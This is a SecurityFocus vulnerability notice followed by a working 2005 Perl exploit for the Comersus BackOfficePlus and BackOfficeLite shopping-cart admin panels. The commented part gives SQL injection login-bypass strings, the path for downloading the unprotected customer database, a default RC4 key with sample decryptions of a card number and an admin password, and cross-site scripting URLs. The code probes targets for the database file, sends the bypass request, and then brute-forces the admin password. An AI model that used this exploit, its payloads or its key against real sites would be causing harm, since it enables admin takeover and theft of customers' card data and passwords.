source: http://www.securityfocus.com/bid/15251/info
 
Comersus BackOfficePlus and BackOfficeLite are prone to multiple input validation and information disclosure vulnerabilities.
 
The applications are prone to SQL injection attacks, information disclosure and multiple cross-site scripting attacks.
 
An attacker can exploit these vulnerabilities to retrieve sensitive and privileged information, gain access to the application as an administrative user and perform cross-site scripting attacks to retrieve cookie-based authentication credentials from victim users; other attacks are also possible. 

#!/usr/bin/perl

# backofflite and backofficeplus multiple remote vulnerabilities
# by: Simo aka _6mO_HaCk <simo_at_morx_org>
# 15 september 2005
# MorX security research team
# www.morx.org
#
# Details:
#
# Logging as admin (tested on 4.2 4.5 4.10 4.11 4.30 4.32 and possibly others
# except for the latest version which is not vulnerable)
#
# the problem is that simply anyone can access the
# shopping cart menu and execute commands as
# admin without knowing the administrator password
# the authentification can by be done with the following
# username and passwords in any order:
# ' OR adminpassword <> '' OR adminpassword = '
# ' OR adminlevel <> '' OR adminlevel = '
# ' OR adminname <> '' OR adminname = '
# exemple:
# username: ' OR adminpassword <> '' OR adminpassword = '
#
# password: ' OR adminpassword <> '' OR adminpassword = '
# or
# username: ' OR adminlevel <> '' OR adminlevel= '
# pasword: ' OR adminlevel <> '' OR adminlevel= '
#
# or any combination of the above
# exemple
# username: ' OR adminpassword <> '' OR adminpassword = '
# password: ' OR adminname <> '' OR adminname = '
#
# backofficelite and backofficeplus (all versions)
# by passing authentification and accessing sensitive information :
#
# anyone can download the comersus database file
# which contain all orders history including customers
# credit card numbers and info and all admin and users
# passwords by submitting an HTTP get request to
# the target file and without being authentified.
# [root@localhost]# telnet 192.168.1.101 80
# Trying 192.168.1.101...
# Connected to 192.168.1.101.
# Escape character is '^]'.
# HEAD /comersus/database/comersus.mdb HTTP/1.0
# Host: 192.168.1.101
# Connection: Close
#
# HTTP/1.1 200 OK
# Server: Microsoft-IIS/5.0
# X-Powered-By: ASP.NET
# Date: Thu, 1 Sep 2005 16:56:34 GMT
# Content-Type: application/x-msaccess
# Accept-Ranges: bytes
# Last-Modified: Thu, 1 Sep 2005 15:03:37 GMT
# ETag: "c0f5106413fbc41:815c"
# Content-Length: 1413120
#
# Connection closed by foreign host.
#
# exemple:
# www.site.com/comersus/database/comersus.mdb
# www.site.com/database/comersus.mdb
#
# Decryption vulnerability (all versions)
# the problem is that comersus encryption tool use
# a default password to encrypt and decrypt credit cards
# for each version, therefore if an attacker exploit the
# previous vulnerability and get comersus.mdb which contains
# all admins and users password and also all credit card numbers
# then they can be easly decrypted using the same default key
# either by downloading the same version or simply by going to
# any backoffice demo site that uses the same version
#
# i have downloaded comersus_backoffice_rc4exec.asp and made
# some wrong orders, then from comersus.mdb which can anyone
# get remotely thru HTTP i took the encrypted credit card number
# then went to a demo site that uses the same version as mine
# and tried to decrypt it, decryption was successful as u can see
# below
#
# Plaintext is the encrypted credit card number tooken from
# comersus.mdb
#
# RC4 Encryption/Decryption Utility
# Decryption Utility
#
# Plaintext was: |133|177|141|43|149|178|61|86|73|51|121|75|144|208|213|232
# Encryption password: HGSDYGDSLWREIUCJD938439402342
#
# Encrypted text:
|205|179|140|41|216|177|57|85|0|52|122|66|213|220|209|162|72|103|173|174|128|239|0|60|192|131|41|116|106|191|34|35|255|227|10|87|67|193|69|35|53|124|195|2
13|242|113|253|126|151|244|51|206|141|69|18|82|97|82
# Decrypted text: 4321123456789876
#
# Encryption took: 0.015625 seconds (?55 msec)
#
# or decrypting an admin password:
# Decryption Utility
#
# Plaintext was: |211|247|209|125|204|239|98|7
# Encryption password: HGSDYGDSLWREIUCJD938439402342
#
# Encrypted text: |205|176|142|43|216|178|58|85|0|55|126|74|213|217|208|235|5|97|164|230|205|234|11|121|138|139|109|48|107
# Decrypted text: bunghole
#
# Encryption took: 0 seconds (?55 msec)
#
# Cross site scripting vulnerability (tested on 5.0 5.09
# 6.0 6.0.1)
#
# this issues are due to a failure in the application to properly sanitize user-supplied input. an attacker may exploit this vulnerability
# to have arbitrary script code executed in the browser
# blackofficeelite:
# www.target.com/comersus/backofficelite/comersus_backoffice_message.asp?message=<script>alert('vul');</script>
# or blackofficeplus
# www.target.com/comersus/backofficeplus/comersus_backoffice_message.asp?message=<script>alert('vul');</script>
#
# www.target.com/comersus/backofficePlus/comersus_backoffice_supportError.asp?error=<script>alert('vul');</script>
#
# i wrote the following code for testing and educational
# purposes, use it at your own risk and on your own machine
# this code will check for those vulnerabilites and if all fail
# it will launch a brute force attack, so make sure to include
# a wordlist
# Tested on the folowing servers:
# Microsoft-IIS/4.0
# Microsoft-IIS/5.0
# Microsoft-IIS/6.0
#
# Author's response:
#
# i have contacted the vendor twice on september 15 th and the 20 th
# but i have never got any answer.
#
# Usage   : perl $0 <Target> <comersus login script path> <Password List>
# Exemple : perl $0 127.0.0.1 backofficelite/comersus_backoffice_login.asp wordlist
#
use Socket;

if(!defined($ARGV[0] && $ARGV[1])){
system (clear);
print "--- Comersus remote exploit\n";
print "--- By _6mO_HaCk\n";
print "---\n";
print "--- www.morx.org\n";
print "---\n";

print("Usage: perl $0 <Target> <comersus login script path> <Password List>\n\n");
exit; }


$http         = $ARGV[0];
$comersuspath = $ARGV[1];
$wordlist     = $ARGV[2];
$loginname    = "admin"; # change this if you wanna brute force
                         # another user's account

$loginname2   = "%27+OR+adminpassword+%3C%3E+%27%27+OR+adminpassword+%3D+%27";
$password2    = "%27+OR+adminpassword+%3C%3E+%27%27+OR+adminpassword+%3D+%27";

$port         = "80";    # change the port if needed
$beep         = chr(7);
$target       = inet_aton($http);
$flag         = 0;

system (clear);
print "--- Comersus remote exploit\n";
print "--- By _6mO_HaCk\n";
print "---\n";
print "--- www.morx.org\n";
print "\n";
print "OK, Trying to exploit $http\n";
print "\n";
print " [x] Step 1: Checking for comersus.mdb\n";
print "\n";
my @results=sendraw("HEAD /database/comersus.mdb HTTP/1.0\nHost: $http\nConnection: close\n\n");
foreach $output (@results){
if ($output =~ /200 OK/) { $flag=5;}}

if ($flag==5)
{
print "[-] /database/comersus.mdb FOUND ! $beep\n";
}
else {
print "[+] /database/comersus.mdb not found\n";
}
my @results=sendraw("HEAD /comersus/database/comersus.mdb HTTP/1.0\nHost: $http\nConnection: close\n\n");
foreach $output (@results){
if ($output =~ /200 OK/) { $flag=4;}}

if ($flag==4){
print "[-] /comersus/database/comersus.mdb FOUND ! $beep\n";
}
else {
print "[+] /comersus/database/comersus.mdb not found\n";
}
print "\n";
print "[x] Step 2: Trying to bypass password authentification ...\n";
sleep (2);
my @results=sendraw("POST /$comersuspath HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nHost: $http\nContent-Length: 142\nCookie:
ASPSESSIONIDSCRRSRCA=GJELEJMBDCFTHBBBBFAMJDOH\nConnection: close\n\nadminName=${loginname2}&adminpassword=${password2}&Submit2=Submit\n\n");
foreach $output (@results){
if ($output =~ /404/) {
print "[-] Cant POST, Comersus login script was not found 404 - check your path and try again\n";
exit;
 }
if ($output =~ /lastLogin=/) { $flag=3;}}

if ($flag==3){
print "$beep\n";
print "[+] REPLY FROM REMOTE HOST: ?lastLogin=\n";
print "[+] VULNERABLE ! AUTHENTIFICATION WAS SUCCESSFULL\n";
print "\n";
print " --------------------- HAPPY HACKING ----------------------\n";
exit;
}
else {
print "[-] not vulnerable\n";
print "[x] starting a brute force attack\n";
print "\n";
}
open (LIST, $wordlist) || die "[-] Can't find/open $wordlist";

$count = -1 ;
while (<LIST>){
($password) = split (/,/);
chomp ($password);
$count++;
@numbers[$count] = $password ;
}
close(LIST);

print "[*] Total of words : $count\n";

for ($y=0;$y<=$count;$y++){
my $password = @numbers[$y];

$content = "adminName=${loginname}&adminpassword=${password}&Submit2=Submit";

my @results=sendraw("POST /$comersuspath HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: $http\nContent-Length: ". length($content)
."\nCookie: ASPSESSIONIDSCRRSRCA=GJELEJMBDCFTHBBBBFAMJDOH\nConnection: close\n\n$content\n\n");
foreach $output (@results){

if ($output =~ /lastLogin=/) { $flag=1;}}
if ($flag==1){

  sleep(2);
  print "\n";
  print "$beep\n";
  print " [+] REPLY FROM REMOTE HOST: ?lastLogin=\n";
  print "\n";
  print " [+] YOUR PASSWORD IS: $password\n";
  print "\n";
  print " ------------ HAPPY HACKING ------------\n";
 exit;
}
else {
 print " [-] $password : FAILED\n";
}
}
 print " ----------------------------------------\n";
 print " [-] ALL FAILED, YOU SUCK :( \n";

sub sendraw {
my ($pstr)=@_;
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
die("[-] Can't creat socket\n");
  if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
  } else { die("[-] Can't connect to $http\n"); }
}
